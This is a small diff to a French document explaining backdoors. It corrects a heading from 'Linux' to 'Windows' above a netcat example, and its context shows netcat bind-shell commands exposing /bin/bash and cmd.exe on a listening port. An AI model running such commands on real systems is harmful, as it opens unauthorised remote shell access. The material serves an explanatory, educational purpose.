@@ -184,7 +184,7 @@ Une porte dérobée (de l'anglais backdoor) est une fonctionnalité inconnue de 
     ```bash
     nc -l -p [port] -e /bin/bash
 
-- **Exécute un shell sous Linux** :
+- **Exécute un shell sous Windows** :
     ```bash    
     nc -l -p [port] -e cmd.exe
 
